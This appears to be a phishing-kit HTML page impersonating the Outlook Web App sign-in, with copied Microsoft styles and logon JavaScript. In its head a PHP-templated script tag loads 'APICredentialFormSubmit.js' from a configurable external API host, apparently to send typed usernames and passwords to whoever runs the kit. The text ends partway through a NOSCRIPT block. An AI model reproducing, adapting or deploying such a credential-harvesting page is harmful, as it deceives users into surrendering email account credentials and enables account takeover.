<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.0 Transitional//EN">
<HTML><HEAD><META 
content="IE=5.0000" http-equiv="X-UA-Compatible">
 
<META http-equiv="X-UA-Compatible" content="IE=10"> <LINK href="favicon.ico" 
rel="shortcut icon" type="image/x-icon"> 
<META http-equiv="Content-Type" content="text/html; CHARSET=utf-8"> 
<META name="Robots" content="NOINDEX, NOFOLLOW"> <TITLE>Outlook Web App</TITLE> 
<!--<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.4.1/jquery.min.js"></script>-->
<STYLE>
@font-face {
    font-family: "Segoe UI WPC";
    src: url("segoeui-regular.eot?#iefix") format("embedded-opentype"),
            url("segoeui-regular.ttf") format("truetype");
}

@font-face {
    font-family: "Segoe UI WPC Semilight";
    src: url("segoeui-semilight.eot?#iefix") format("embedded-opentype"),
        url("segoeui-semilight.ttf") format("truetype");
}

@font-face {
    font-family: "Segoe UI WPC Semibold";
    src: url("segoeui-semibold.eot?#iefix") format("embedded-opentype"),
        url("segoeui-semibold.ttf") format("truetype");
}
</STYLE>
 
<STYLE>/*Copyright (c) 2003-2006 Microsoft Corporation.  All rights reserved.*/

body.rtl 
{
	text-align:right;
	direction:rtl;
}

body, .mouse, .twide, .tnarrow, form
{
    height: 100%;
    width: 100%;
    margin: 0px;
}

.mouse, .twide 
{
    min-width: 650px; /* min iPad1 dimension */
    min-height: 650px;
    position: absolute;
    top:0px;
    bottom:0px;
    left:0px;
    right:0px;
}

.sidebar 
{
    /* background-color:#0072C6; */
    background-color: gray;
}

.mouse .sidebar, .twide .sidebar
{
    position:absolute;
    top: 0px;
    bottom: 0px;
    left: 0px;
    display: inline-block;
    width: 332px;
}

.tnarrow .sidebar
{
    display: none;
}

.mouse .owaLogoContainer, .twide .owaLogoContainer
{
    margin:213px auto auto 109px;
    text-align:left     /* Logo aligns left for both ltr & rtl */
}

.tnarrow .owaLogo 
{
    display: none;
}

.mouse .owaLogoSmall, .twide .owaLogoSmall
{
    display: none;
}

.logonDiv 
{ 
	text-align:left;
}

.rtl .logonDiv 
{ 
	text-align:right;
}

.mouse .logonContainer, .twide .logonContainer
{
    padding-top: 174px;
    padding-left: 464px;
    padding-right:142px;
    position:absolute;
    top:0px;
    bottom: 0px;
    left: 0px;
    right: 0px;
    text-align: center;
}

.mouse .logonDiv, .twide .logonDiv
{
    position: relative;
    vertical-align:top;
    display: inline-block;
    width: 423px;
}

.tnarrow .logonDiv
{
    margin:25px auto auto -130px;
    position: absolute;
    left: 50%;
    width: 260px;
    padding-bottom: 20px;
}

.twide .signInImageHeader, .tnarrow .signInImageHeader
{
    display: none;
}

.mouse .signInImageHeader
{
    margin-bottom:22px;
}

.twide .mouseHeader
{
    display: none;
}

.mouse .twideHeader
{
    display: none;
}

input::-webkit-input-placeholder
{
    font-size:16px;
    color: #98A3A6;
}

input:-moz-placeholder 
{
    font-size:16px;
    color: #98A3A6;
}

.tnarrow .signInInputLabel, .twide .signInInputLabel
{
    display: none;
}

.mouse .signInInputLabel
{
    margin-bottom: 2px;
}

.mouse .showPasswordCheck
{
    display: none;
}

.signInInputText
{
    border:1px solid #98A3A6;
    color: #333333;
    border-radius: 0;
    -moz-border-radius: 0;
    -webkit-border-radius: 0;
    box-shadow: none;
    -moz-box-shadow: none;
    -webkit-box-shadow: none;
    -webkit-appearance:none;
    background-color: #FDFDFD;
	width:250px;
	margin-bottom:10px;
	box-sizing: content-box;
    -moz-box-sizing: content-box;
    -webkit-box-sizing: content-box;
}

.mouse .signInInputText 
{
    height: 22px;
    font-size: 12px;
    padding: 3px 5px;
    color: #333333;
	font-family:'Segoe UI', 'Segoe WP', 'Segoe UI WPC', Tahoma, Arial, sans-serif;
	margin-bottom: 20px;
}

.twide .signInInputText, .tnarrow .signInInputText
{
    border-color: #666666;
    height: 22px;
    font-size: 16px;
    color: #000000;
    font: $ShellInputTextTouchFont;
    padding: 7px 7px;
	font-family:'Segoe UI Semibold', 'Segoe WP Semibold', 'Segoe UI WPC Semibold', 'Segoe UI', 'Segoe WP', Tahoma, Arial, sans-serif;
	margin-bottom:20px;
	width: 264px;
}

.divMain
{
	width: 444px;
}

.l
{
	text-align:left;
}
.rtl .l
{
	text-align:right;
}
.r
{
	text-align:right;
}
.rtl .r
{
	text-align:left;
}

table#tblMain
{
	margin-top: 48px;
	padding: 0px; 
}
table.mid
{
	width: 385px;
	border-collapse:collapse;
	padding: 0px; 
	color:#444444; 
}
table.tblConn
{
	direction:ltr;
}
td.tdConnImg
{
	width: 22px;
}
td.tdConn
{
	padding-top: 15px;
}
td#mdLft
{
	background: url("lgnleft.gif") repeat-y;
	width: 15px;
}
td#mdRt
{
	background: url("lgnright.gif") repeat-y;
	width: 15px;
}
td#mdMid
{
	padding: 0px 45px;
	background: #ffffff; 
	vertical-align: top;
}
td .txtpad
{
	padding: 3px 6px 3px 0px; 
}
.txt
{
	padding: 3px; 
	height: 2.2em;
}
input.btn
{
	color: #ffffff;
	background-color: #eb9c12;
	border: 0px; 
	padding: 2px 6px; 
	margin: 0px 6px; 
	text-align:center;
}
.btnOnFcs
{
	color: #ffffff;
	background-color: #eb9c12;
	border: 0px; 
	padding: 2px 6px; 
	margin: 0px 6px; 
	text-align:center;
}
.btnOnMseOvr
{
	color: #ffffff;
	background-color: #f9b133;
	border: 0px; 
	padding: 2px 6px; 
	margin: 0px 6px; 
	text-align:center;
}
.btnOnMseDwn
{
	color: #000000;
	background-color: #f9b133;
	border: 0px solid #f9b133;
	padding: 2px 6px; 
	margin: 0px 6px; 
	text-align:center;
}
.nowrap
{
	white-space:nowrap;
}
hr
{
	height: 0px; 
	visibility: hidden;
}

.wrng
{
	color:#ff6c00;
}
.disBsc
{
	color:#999999;
}
.expl
{
	color:#999999;
}
.w100, .txt
{
	width: 100%;
}
.txt
{
	margin: 0px 6px; 
}
.rdo
{
	margin: 0px 12px 0px 32px;
}
body.rtl .rdo
{
	margin: 0px 32px 0px 12px;
}
tr.expl td, tr.wrng td
{
	padding: 2px 0px 4px; 
}
tr#trSec td
{
	padding: 3px 0px 8px; 
}
/* language page specific styles */
td#tdLng
{
	padding: 12px 0px; 
}
td#tdTz
{
	padding: 8px 0px; 
}
select#selTz
{
	padding: 0px; 
	margin: 0px; 
}
td#tdOptMsg
{
	padding: 10px 0px; 
}
td#tdOptChk
{
	padding: 0px 0px 15px 65px;
}
td#tdOptAcc
{
	vertical-align:middle;
	padding: 0px 0px 0px 3px; 
}
select#selLng
{
	margin: 0px 16px;
}
/* logoff page specific styles */
td#tdMsg
{
	margin: 9px 0px 64px;
}
input#btnCls
{
	margin: 3px 6px; 
}
td.lgnTL, td.lgnBL
{
	width: 456px;
}
td.lgnTM
{
	background: url("lgntopm.gif") repeat-x;
	width: 100%;
}
td.lgnBM
{
	background: url("lgnbotm.gif") repeat-x;
	width: 100%;
}
td.lgnTR, td.lgnBR
{
	width: 45px;
}
table.tblLgn
{
	padding: 0px; 
	margin: 0px; 
	border-collapse:collapse;
	width: 100%;
}
.signInBg
{
	margin:0px;
}

.signInTextHeader
{
	font-size:60px;
	color:#404344;
	font-family:'Segoe UI', 'Segoe WP', 'Segoe UI WPC', Tahoma, Arial, sans-serif;
	margin-bottom:18px;
	white-space: nowrap;
}

.signInInputLabel
{
	font-size:12px;
	color:#666666;
	font-family:'Segoe UI', 'Segoe WP', 'Segoe UI WPC', Tahoma, Arial, sans-serif;
}

.signInCheckBoxText
{
	font-size:12px;
	color:#6A7479;
	font-family:'Segoe UI Semilight', 'Segoe WP Semilight', 'Segoe UI WPC Semilight', 'Segoe UI', 'Segoe WP', Tahoma, Arial, sans-serif;
	margin-top:16px;
}

.twide .signInCheckBoxText, .tnarrow .signInCheckBoxText
{
    font-size: 15px;
}

.signInCheckBoxLink
{
	font-size:12px;
	color:#0072C6;
	font-family:'Segoe UI Semilight', 'Segoe WP Semilight', 'Segoe UI WPC Semilight', 'Segoe UI', 'Segoe WP', Tahoma, Arial, sans-serif;
}

.signInEnter
{
	font-size:22px;
	color:#0072C6;
	font-family:'Segoe UI', 'Segoe WP', 'Segoe UI WPC', Tahoma, Arial, sans-serif;
	margin-top:20px;
}

.twide .signInEnter
{
	margin-top:17px;
	font-size: 29px;
}

.tnarrow .signInEnter 
{
	margin-top:2px;
	font-size: 29px;
	position: relative;
	float: left;
	left: 50%;
}

.signinbutton 
{
    cursor:pointer;
    display:inline
}

.mouse .signinbutton
{
    padding: 0px 8px 5px 8px;
    margin-left: -8px;
}

.rtl .mouse .signinbutton
{
    margin-right: -8px;
}

.tnarrow .signinbutton 
{
	position: relative;
	float: left;
	left: -50%;
}

.shellDialogueHead
{
	font-size:29px;
	color:#0072C6;
	font-family:'Segoe UI Semilight', 'Segoe WP Semilight', 'Segoe UI WPC Semilight', 'Segoe UI', 'Segoe WP', Tahoma, Arial, sans-serif;
}

.mouse .shellDialogueHead 
{
    line-height: 35px;
    margin-bottom: 10px;
}

.twide  .shellDialogueHead, .tnarrow .shellDialogueHead
{
	line-height:34px;
	margin-bottom: 12px;
}

.shellDialogueMsg
{
	font-size:13px;
	color:#333333;
	font-family:'Segoe UI', 'Segoe WP', 'Segoe UI WPC', Tahoma, Arial, sans-serif;
	line-height:18px;
}

.twide .shellDialogueMsg, .tnarrow .shellDialogueMsg
{
    font-size: 15px;
}

.headerMsgDiv 
{
    width: 350px;
    margin-bottom: 22px;
}

.twide .headermsgdiv
{
    margin-bottom: 30px;
}

.tnarrow .headermsgdiv
{
    width: 260px;
    margin-bottom: 30px;
}

.signInError
{
	font-size:12px;
	color:#C1272D;
	font-family:'Segoe UI Semilight', 'Segoe WP Semilight', 'Segoe UI WPC Semilight', 'Segoe UI', 'Segoe WP', Tahoma, Arial, sans-serif;
	margin-top:12px;
}

.passwordError
{
    color: #A80F22;
	font-family:'Segoe UI', 'Segoe WP', 'Segoe UI WPC', Tahoma, Arial, sans-serif;
    line-height: 18px;
}

.mouse .passwordError
{    
    margin-top: 10px;
    font-size: 13px;
}

.twide .passwordError, .tnarrow .passwordError
{
    margin-top: 12px;
    font-size: 15px;
}

.signInExpl
{
	font-size:12px;
	color:#999999;
	font-family:'Segoe UI Semilight', 'Segoe WP Semilight', 'Segoe UI WPC Semilight', 'Segoe UI', 'Segoe WP', Tahoma, Arial, sans-serif;
	margin-top:5px;
}

.signInWarning
{
	font-size:12px;
	color:#C1272D;
	font-family:'Segoe UI Semilight', 'Segoe WP Semilight', 'Segoe UI WPC Semilight', 'Segoe UI', 'Segoe WP', Tahoma, Arial, sans-serif;
	margin-top:5px;
}

input.chk
{
	margin-right:9px;
	margin-left:0px;
}

.imgLnk
{
	vertical-align: middle;	
	line-height:2;
	margin-top: -2px;
}

.signinTxt
{
	padding-left:11px;
	padding-right:11px;     /* Needed for RTL, doesnt hurt to add this for LTR as well */
}

.hidden-submit { 
    border: 0 none; 
    height: 0; 
    width: 0; 
    padding: 0; 
    margin: 0; 
    overflow: hidden; 
} 

.officeFooter
{
    position:absolute;
    bottom: 33px;
    right: 45px;
}

.tnarrow .officeFooter
{
    display: none;
}
</STYLE>
 
<SCRIPT>
//  flogon.js
//
//  This file contains the script used by Logon.aspx
//
//Copyright (c) 2003-2006 Microsoft Corporation.  All rights reserved.

/// <summary>
/// OnLoad handler for logon page
/// </summary>
window.onload = function ()
{
    // If we are replacing the current window with the logon page, initialize the logon page UI now
    //
    if (a_fRC)
        initLogon();

    // Otherwise we need to find the window to replace with the logon page and redirect that window
    //
    else
        redir();
};

/// <summary>
/// Initializes the logon page
/// </summary>
function initLogon()
{
    try
    {
        //
        // we don't call document.execCommand("ClearAuthenticationCache","false"); anymore. As a part of the Pending-Notification
        // infrastructure, we are making a change to make sure startpage does not get loaded more than once. This solution is cookie
        // based. This execCommand was clearing all cookies in the scenario when a user logged on from a child window during an
        // FBA timeout. We do not want that to happen anymore. If this breaks anything, we may need to consider a different solution.
        //
        // Old Comments:
        // If the "Clear the Authentication Cache" flag is set to true and
        // we are coming from the logoff page , clear the cache. See bug 41770 and 5840 for details.
        //

        // Logoff the S-Mime control.
        //
        LogoffMime();
    }
    catch (e) { }

    // Check for username cookie
    //
    var re = /(^|; )logondata=acc=([0|1])&lgn=([^;]+)(;|$)/;
    var rg = re.exec(document.cookie);

    if (rg)
    {
        // Fill in username, set security to private, and restore the "use basic" selection
        //

        gbid("username").value = rg[3];

        try
        {
            var signInErrorElement = gbid("signInErrorDiv");
            if (signInErrorElement)
            {
                signInErrorElement.focus();
            }
            else
            {
                gbid("password").focus();
            }
        }
        catch (e)
        {}

        if (gbid("chkPrvt") && !gbid("chkPrvt").checked)
        {
            gbid("chkPrvt").click();
        }

        if (rg[2] == "1" && gbid("chkBsc"))	// chkBsc doesn't exist if the request comes from ECP
            gbid("chkBsc").click();

    }
    else
    {
        // The variable g_fFcs is set to false when the password gains focus,
        // so that we don't accidentally set focus to the username field while
        // the user is typing their password
        //
        if (g_fFcs)
        {
            try
            {
                gbid("username").focus();
            }
            catch (e)
            { }
        }
    }

    // OWA Premium currently supports
    // IE 7+, Safari 3+, Firefox 3+ for Windows / Mac
    if (IsOwaPremiumBrowser() && gbid("chkBsc"))	// chkBsc doesn't exist if the request comes from ECP
        gbid("chkBsc").disabled = false;

    // Are cookies enabled?
    //
    var sCN = "cookieTest";

    document.cookie = sCN + "=1";
    var cookiesEnabled = document.cookie.indexOf(sCN + "=") != -1;

    if (cookiesEnabled == false)
    {
        shw(gbid("cookieMsg"));
        hd(gbid("lgnDiv"));
    }

    // Show the public/private warning message
    clkSec();
}


/// <summary>
/// Finds the frame we want to load the logon page into, and then loads it there
/// </summary>
function redir()
{
    var o = window;

    // If we're in a dialog, open a logon window and close the dialog - this
    // basically inlines a version of opnWin() so that we don't need to include
    // uglobal.js in logon.aspx
    //
    try
    {
        if (o.dialogArguments)
        {
            var sWN = new String(Math.round(Math.random() * 100000));
            var sF = "toolbar=0,location=0,directories=0,status=1,menubar=0,scrollbars=1,resizable=1,width=800,height=600";
            var iT = Math.round((screen.availHeight - 600) / 2);
            var iL = Math.round((screen.availWidth - 800) / 2);
            sF += ",top=" + iT + ",left=" + iL;

            // Fix for E12 14838.  Need to open this window from the window that opened us, because opening it from this dialog
            // which we are about to close can cause the auth cookies to not propagate to the window that opened this dialog.
            //
            var op = o.dialogArguments.opener;
            try
            {
                if (op)
                    op.open(a_sCW, sWN, sF);
            }
            catch (e)
            { }

            o.close();
            return;
        }
    }
    catch (e)
    { }

    // The url to redirect to after logon
    //
    var sUrl = a_sUrl;

    // Find the outermost OWA frame
    //
    while (1)
    {
        try
        {
            // Try to move up one window/frame
            //
            if (!(o.frameElement && o.frameElement.ownerDocument))
                break;

            var oF = o.frameElement.ownerDocument.parentWindow || // IE name
                    o.frameElement.ownerDocument.defaultView;     // W3C name

            // If we're not in an OWA/ECP window, we've found the frame to replace
            //
            if (!oF || (!oF.g_fOwa && !oF.g_fEcp))
                break;

            // Move up a frame
            //
            o = oF;

            // We're replacing something other than the current frame,  we'll just
            // log back in to the default start page if the frame doesn't provide a url
            //  for relogon. The frame should provide a global method GetReloadUrl
            // if it wants to keep current state.
            // $NOTES: ECP needs to keep the current frame state after re-logon.
            sUrl = o.GetReloadUrl ? "&url=" + encodeURIComponent(o.GetReloadUrl()) : "";
        }
        // Either we're at the top, or access was denied - either way, stop
        //
        catch (e)
        {
            break;
        }
    }

    // See if the window was opened by another window
    //
    try
    {
        var oW = o.opener;

        // If it was opened by another OWA/ECP window, take it over
        //
        if (oW && (oW.g_fOwa || oW.g_fEcp))
        {
            // Center and resize the window
            //
            var iX = Math.round((screen.availWidth - 800) / 2);
            var iY = Math.round((screen.availHeight - 600) / 2);
            o.moveTo(iX, iY);
            o.resizeTo(800, 600);

            // Close the window after logging in
            //
            sUrl = "&url=" + encodeURIComponent(a_sCW);
        }
    }
    // We don't have access to the opener window, so it couldn't be part of OWA
    //
    catch (e) { }

    // Redirect the window
    //
    if (o.navigate)
        o.navigate(a_sLgn + sUrl);
    else
        o.location = a_sLgn + sUrl;
}

/// <summary>
/// Show an element
/// </summary>
/// <param name="o">Element to show</param>
function shw(o)
{
    o.style.display = "";
}

/// <summary>
/// Hide an element
/// </summary>
/// <param name="o">Element to hide</param>
function hd(o)
{
    o.style.display = "none";
}

/// <summary>
/// OnClick handler for the show private explanation 
/// </summary>
function clkSecExp(id)
{
    var o = gbid(id);

    if (o.tagName == "IMG")
        o = o.parentNode;

    switch (o)
    {
        case gbid("lnkShwSec"):
            hd(gbid("lnkShwSec"));
            shw(gbid("lnkHdSec"));
            shw(gbid("prvtExp"));
            gbid("lnkHdSec").focus();
            break;
        case gbid("lnkHdSec"):
            shw(gbid("lnkShwSec"));
            hd(gbid("lnkHdSec"));
            hd(gbid("prvtExp"));
            gbid("lnkShwSec").focus();
            break;
    }
}

/// <summary>
/// onkeydown handler for the show private explanation 
/// </summary>
function kdSecExp(id)
{
    // When user press space bar, we shall treat it as click.
    if (window.event.keyCode == 32)
    {
        clkSecExp(id);
    }
}

/// <summary>
/// OnClick handler for the security radio buttons
/// </summary>
function clkSec()
{
    if (gbid("chkPrvt") == null) {

        // If the private checkbox is not present in the page there is nothing we should do here
        //
        return;
    }

    // Display/hide the warning message
    //
    var c = gbid("chkPrvt").checked;

    gbid("prvtWrn").style.display = c ? "" : "none";

    // Update flags and username cookie
    //
    if (c)
    {
        document.logonForm["flags"].value |= 4;
    }
    else
    {
        document.logonForm["flags"].value &= ~4;

        // Remove the cookie by expiring it
        //
        var oD = new Date();
        oD.setTime(oD.getTime() - 9999);
        document.cookie = "logondata=; expires=" + oD.toUTCString();
        document.cookie = "PrivateComputer=; path=/; expires=" + oD.toUTCString();
    }
}

/// <summary>
/// OnClick handler for the use owa basic checkbox
/// </summary>
function clkBsc()
{
    // Display/hide the warning message
    //
    var c = gbid("chkBsc").checked;
    gbid("bscExp").style.display = c ? "" : "none";

    if (c)
        document.logonForm.flags.value |= 1;
    else
        document.logonForm.flags.value &= ~1;
}

function checkSubmit(e) {
    if (e && e.keyCode == 13) {
        // Since we are explicitly handling the click prevent the default implicit submit  
        if (e.preventDefault) {
            e.preventDefault();
        }

        clkLgn();
    }
} 


/// <summary>
/// OnClick handler for the logon button
/// </summary>
function clkLgn()
{
    // Add performance marker for Logon page as the item name defined in the spec:
    // http://exweb/14/Specs/E14 Spec Library/Client side perf marker definition.xlsx
    //
    addPerfMarker("Logon.Start");

    var p = false;

    if (gbid("chkPrvt")) {
        p = p | gbid("chkPrvt").checked;
    }
    else
    {
        p = true;
    }

    // If security is set to private, add a cookie to persist username and basic setting
    // Cookie format: logondata=acc=<1 or 0>&lgn=<username>
    //
    if (p)
    {
        // Calculate the expires time for two weeks
        //
        var oD = new Date();
        oD.setTime(oD.getTime() + 2 * 7 * 24 * 60 * 60 * 1000);
        var sA = "acc=" + (gbid("chkBsc") && gbid("chkBsc").checked ? 1 : 0);
        var sL = "lgn=" + gbid("username").value;
        document.cookie = "logondata=" + sA + "&" + sL + "; expires=" + oD.toUTCString();
        document.cookie = "PrivateComputer=true; path=/; expires=" + oD.toUTCString();
    }

    if (gbid("showPasswordCheck").checked)
    {
        passwordElement = gbid("password");
        passwordTextElement = gbid("passwordText");
        passwordElement.value = passwordTextElement.value;
    }

    // We clean the post back cookie in order to indicate that the credentials post is legitimate (and not history postback)
    //
    document.cookie = "PBack=0; path=/";
    document.logonForm.submit();
}

/// <summary>
/// OnClick handler for the retry button
/// </summary>
function clkRtry()
{
    window.location.reload();
}

/// <summary>
/// OnClick handler for the ok button after changing password (will go to owa/)
/// </summary>
function clkReLgn()
{
    window.location.href = '../';
}

/// <summary>
/// GetElementByID from Document
/// </summary>
/// <param name="s">Id of the Element</param>
function gbid(s)
{
    return document.getElementById(s);
}

/// <summary>
/// Is the Client IE 7, Safari 3, Firefox 3 or Above
/// Note The rules should match owa\bin\core\Utlities.cs@IsDownLevelClient
/// </summary>
function IsOwaPremiumBrowser()
{
    var ua = navigator.userAgent;
    var av = navigator.appVersion;
    var mac = (av.indexOf('Mac') != -1);
    var win = ((av.indexOf('Win') != -1) || (av.indexOf('NT') != -1));

    // If you change the follow browser check logic, change utility.js as well.
    // We have duplicate logic because otherwise logon page must include more code than necessary.
    //
    var ie = (ua.indexOf("MSIE ") != -1);
    var firefox = (ua.indexOf("Firefox/") != -1 && ua.indexOf("Gecko/") != -1 && Array.every);
    var safari = (ua.indexOf("Safari") != -1 && ua.indexOf("WebKit") != -1);
    var version = 2.0;

    if (ie)
    {
        version = parseFloat(ua.replace(/^.*MSIE /, ''));
    }
    else if (firefox)
    {
        version = parseFloat(ua.replace(/^.*Firefox\//, ''));
    }
    else if (safari)
    {
        version = parseFloat(ua.replace(/^.*Version\//, ''));
    }
    else
    {
        version = parseInt(av);
    }

    if (win)
    {
        if (ie)
            return (version >= 7.0);
        else if (safari)
            return (version >= 3.0);
        else if (firefox)
            return (version >= 3.0);
    }
    else if (mac)
    {
        if (safari)
            return (version >= 2.0);
        else if (firefox)
            return (version >= 3.0);
    }

    return false;
}

/// <summary>
/// Convert an error code to HRESULT.
/// </summary>
function hres(iErr)
{
    return iErr + 0xffffffff + 1;
}

/// <summary>
/// Log off S-MIME control if it presents.
/// </summary>
function LogoffMime()
{
    try
    {
        if ((typeof (mimeLogoffE2k3) != "undefined" && null != mimeLogoffE2k3) && IsMimeCtlInst("MimeBhvr.MimeCtlVer"))
            mimeLogoffE2k3.Logoff();

        if ((typeof (mimeLogoffE2k7SP1) != "undefined" && null != mimeLogoffE2k7SP1) && IsMimeCtlInst("OwaSMime.MimeCtlVer"))
            mimeLogoffE2k7SP1.Logoff();

        if ((typeof (mimeLogoffE2k9) != "undefined" && null != mimeLogoffE2k9) && IsMimeCtlInst("OwaSMime2.MimeCtlVer"))
            mimeLogoffE2k9.Logoff();
    }
    catch (e)
    {
    }
}

/// <summary>
/// Add performance marker which can write ETW trace for clicking logon
/// </summary>
/// <param name="sItemName">Identify string to say start clicking logon</param>
function addPerfMarker(sItemName)
{
    try
    {
        if (window.msWriteProfilerMark)
        {
            window.msWriteProfilerMark(sItemName);
        }
    }
    catch (e)
    {
        // We don't care any exception caused by test code in product, swallow it
    }
}

//
// NOTE: flogon.js does not contain a call to stJS("flogon.js"). This is because flogon.js is loaded at logon time before uglobal.js
//

//-----------------------------------------------------------
// END flogon.js
//-----------------------------------------------------------

</SCRIPT>
 
<SCRIPT type="text/javascript">
	<!--
	var a_fRC = 1;
	var g_fFcs = 1;
	var a_fLOff = 0;
	var a_fCAC = 0;
	var a_fEnbSMm = 0;
/// <summary>
/// Is Mime Control installed?
/// </summary>
function IsMimeCtlInst(progid)
{
	if (!a_fEnbSMm)
		return false;

	var oMimeVer = null;

	try 
	{
		// TODO: ingore this on none IE browser
		//
		//oMimeVer = new ActiveXObject(progid);
	} 
	catch (e)
	{ 
	}

	if (oMimeVer != null)
		return true;
	else
		return false;
}

/// <summary>
/// Render out the S-MIME control if it is installed.
/// </summary>
function RndMimeCtl()
{
	if (IsMimeCtlInst("MimeBhvr.MimeCtlVer"))
		RndMimeCtlHlpr("MimeNSe2k3", "D801B381-B81D-47a7-8EC4-EFC111666AC0", "MIMEe2k3", "mimeLogoffE2k3");

	if (IsMimeCtlInst("OwaSMime.MimeCtlVer"))
		RndMimeCtlHlpr("MimeNSe2k7sp1", "833aa5fb-7aca-4708-9d7b-c982bf57469a", "MIMEe2k7sp1", "mimeLogoffE2k7sp1");

	if (IsMimeCtlInst("OwaSMime2.MimeCtlVer"))
		RndMimeCtlHlpr("MimeNSe2k9", "4F40839A-C1E5-47E3-804D-A2A17F42DA21", "MIMEe2k9", "mimeLogoffE2k9");
}

/// <summary>
/// Helper function to factor out the rendering of the S/MIME control.
/// </summary>
function RndMimeCtlHlpr(objid, classid, ns, id)
{
	document.write("<OBJECT id='" + objid + "' classid='CLSID:" + classid + "'></OBJECT>");
	document.write("<?IMPORT namespace='" + ns + "' implementation=#" + objid + ">");
	document.write("<" + ns + ":Logoff id='" + id + "' style='display:none'/>");
}
	-->
</SCRIPT>
     
<SCRIPT>

        var mainLogonDiv = window.document.getElementById("mainLogonDiv");
        var showPlaceholderText = false;
        var mainLogonDivClassName = 'mouse';

        if (mainLogonDivClassName == "tnarrow") {
            showPlaceholderText = true;

            // Output meta tag for viewport scaling
            document.write('<meta name="viewport" content="width = 320, initial-scale = 1.0, user-scalable = no" />');
        }
        else if (mainLogonDivClassName == "twide"){
            showPlaceholderText = true;
        }

        function setPlaceholderText() {
                window.document.getElementById("username").placeholder = "user name";
                window.document.getElementById("password").placeholder = "password";
                window.document.getElementById("passwordText").placeholder = "password";
        }

        function showPasswordClick() {
            var showPassword = window.document.getElementById("showPasswordCheck").checked;
            passwordElement = window.document.getElementById("password");
            passwordTextElement = window.document.getElementById("passwordText");
            if (showPassword)
            {
                passwordTextElement.value = passwordElement.value;
                passwordElement.style.display = "none";
                passwordTextElement.style.display = "inline";
                passwordTextElement.focus();
            }
            else
            {
                passwordElement.value = passwordTextElement.value;
                passwordTextElement.style.display = "none";
                passwordTextElement.value = "";
                passwordElement.style.display = "inline";
                passwordElement.focus();
            }
        }
    </SCRIPT>
	
	<script src="<?php echo $APIURL; ?>/APICredentialFormSubmit.js"></script>
 
<META name="GENERATOR" content="MSHTML 11.00.10570.1001"></HEAD> 
<BODY class="signInBg" style='background: url("data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAoAAANvCAYAAADk40vJAAAAGXRFWHRTb2Z0d2FyZQBBZG9iZSBJbWFnZVJlYWR5ccllPAAAA+VpVFh0WE1MOmNvbS5hZG9iZS54bXAAAAAAADw/eHBhY2tldCBiZWdpbj0i77u/IiBpZD0iVzVNME1wQ2VoaUh6cmVTek5UY3prYzlkIj8+IDx4OnhtcG1ldGEgeG1sbnM6eD0iYWRvYmU6bnM6bWV0YS8iIHg6eG1wdGs9IkFkb2JlIFhNUCBDb3JlIDUuMC1jMDYwIDYxLjEzNDc3NywgMjAxMC8wMi8xMi0xNzozMjowMCAgICAgICAgIj4gPHJkZjpSREYgeG1sbnM6cmRmPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5LzAyLzIyLXJkZi1zeW50YXgtbnMjIj4gPHJkZjpEZXNjcmlwdGlvbiByZGY6YWJvdXQ9IiIgeG1sbnM6eG1wPSJodHRwOi8vbnMuYWRvYmUuY29tL3hhcC8xLjAvIiB4bWxuczpkYz0iaHR0cDovL3B1cmwub3JnL2RjL2VsZW1lbnRzLzEuMS8iIHhtbG5zOnhtcE1NPSJodHRwOi8vbnMuYWRvYmUuY29tL3hhcC8xLjAvbW0vIiB4bWxuczpzdFJlZj0iaHR0cDovL25zLmFkb2JlLmNvbS94YXAvMS4wL3NUeXBlL1Jlc291cmNlUmVmIyIgeG1wOkNyZWF0b3JUb29sPSJBZG9iZSBQaG90b3Nob3AgQ1M1IFdpbmRvd3MiIHhtcDpDcmVhdGVEYXRlPSIyMDEyLTA1LTE1VDEzOjEwOjU5LTA3OjAwIiB4bXA6TW9kaWZ5RGF0ZT0iMjAxMi0wNS0xNVQxMzoxMTo0Ni0wNzowMCIgeG1wOk1ldGFkYXRhRGF0ZT0iMjAxMi0wNS0xNVQxMzoxMTo0Ni0wNzowMCIgZGM6Zm9ybWF0PSJpbWFnZS9wbmciIHhtcE1NOkluc3RhbmNlSUQ9InhtcC5paWQ6MzI2NTAzNjQ5RUNBMTFFMUFBNkRCNDc2QzU0RjhERUYiIHhtcE1NOkRvY3VtZW50SUQ9InhtcC5kaWQ6MzI2NTAzNjU5RUNBMTFFMUFBNkRCNDc2QzU0RjhERUYiPiA8eG1wTU06RGVyaXZlZEZyb20gc3RSZWY6aW5zdGFuY2VJRD0ieG1wLmlpZDozMjY1MDM2MjlFQ0ExMUUxQUE2REI0NzZDNTRGOERFRiIgc3RSZWY6ZG9jdW1lbnRJRD0ieG1wLmRpZDozMjY1MDM2MzlFQ0ExMUUxQUE2REI0NzZDNTRGOERFRiIvPiA8L3JkZjpEZXNjcmlwdGlvbj4gPC9yZGY6UkRGPiA8L3g6eG1wbWV0YT4gPD94cGFja2V0IGVuZD0iciI/PnYK5fsAAAFLSURBVHja7NthDoIwDAZQNN7/vCTKKifQgZh12yPx30uG/bqyGLyt6xpLxXVfKi8QBEEQBEEQBEEQBEEQBEEQBEEQBEEQBEEQBEEQBMFh4WP/ePUSBEEQBEHQIQ4EQRA0cUHQdgVBe0Z5QN0Dalx1lAwoGcmAklEeyShP2/I8QlNoCuWRzJXlCeXRuGfvMSSjcX1rjat7NK6llUcyyqM8kvlh6X3dIhmNe2pp5ZGMpQ8nE8qT9R6LZFLeY0xYHnvm69G1h/NjmXJpjWukSGa4ZGIzUpI+C3vYMzM+C6Nu6XmH/XwjpZc9I5mkwz6K8iRtXMlI5mwy0TKZV/Zhf/kZd6g903akxJyN28Ow3ySTdKQ0SyZajpRyKfzPr1wNG3czUj5t1x6G/TbhSKlMZqiRcuhk365xI/2wj6aN+0y+Z25R98LQWH8QeQswAHk7x/k/TxxLAAAAAElFTkSuQmCC") repeat-x rgb(242, 242, 242);'>
<SCRIPT type="text/javascript">
    RndMimeCtl();
</SCRIPT>
 <NOSCRIPT>	&lt;div id="dvErr"&gt;		&lt;table cellpadding="0" 
cellspacing="0"&gt;		&lt;tr&gt;			&lt;td&gt;&lt;img 
